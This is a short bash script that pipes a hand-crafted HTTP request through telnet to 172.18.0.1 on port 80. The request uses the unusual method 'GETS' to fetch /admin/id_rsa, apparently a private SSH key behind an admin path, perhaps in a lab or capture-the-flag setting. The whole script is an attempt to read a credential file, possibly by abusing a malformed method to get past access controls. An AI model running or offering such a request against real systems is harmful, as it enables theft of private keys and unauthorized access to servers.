#!/bin/bash

{ echo "GETS /admin/id_rsa HTTP/1.0"; echo ""; echo ""; sleep 2; } | telnet 172.18.0.1 80